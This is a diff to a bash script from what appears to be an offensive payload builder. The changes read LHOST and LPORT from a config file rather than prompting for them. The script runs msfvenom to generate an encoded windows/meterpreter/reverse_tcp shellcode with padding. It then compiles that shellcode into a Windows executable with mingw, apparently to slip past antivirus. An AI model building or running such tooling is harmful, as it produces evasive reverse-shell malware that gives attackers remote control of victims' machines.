@@ -9,12 +9,21 @@ searchsploit=`sed -n 17p $file`
 else
 	echo "Configuration file does not exists , run setup.sh first ."
 exit 1
+
+
+fi
+path=`pwd`
+defcon=$path/config/conf.def
+if [ -f "$defcon" ]
+then
+yourip=`sed -n 1p $defcon`
+yourport=`sed -n 2p $defcon`
 fi
 
 #get user local ip , public ip & hostname into variables
 lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
-hostn=`host $publicip | awk '{print $5}'`
+hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
 
 # Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
 # You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
@@ -103,10 +112,18 @@ echo -e $yellow "Your local IP address is : $lanip"
 echo -e $yellow "Your public IP address is : $publicip"
 echo -e $yellow "Your Hostname is : $hostn"
 echo -e $okegreen ""
-
-read -p ' Set LHOST IP: ' payloadLHOST; read -p ' Set LPORT: ' payloadLPORT                                                                        
-
-
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
+if [ -z "$yourip" ]; then
+read -p '  Set LHOST IP: ' yourip
+fi
+echo -e $okegreen ""
+if [ -z "$yourport" ]; then
+read -p '  Set LPORT: ' yourport
+fi                                                                       
 
 payload="windows/meterpreter/reverse_tcp"
 msfvenomBadChars="\x00\xff"
@@ -223,7 +240,7 @@ while [[ ! -f "$outputExe" ]]; do
     generatePadding
   
     echo "" >> $cProg
-    $msfvenom -p ${payload} LHOST=$payloadLHOST LPORT=$payloadLPORT -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
+    $msfvenom -p ${payload} LHOST=$yourip LPORT=$yourport -b ${msfvenomBadChars} -e ${msfvenomEncoder} -i ${msfvenomIterations} -f c >> $cProg
 
     generatePadding
 
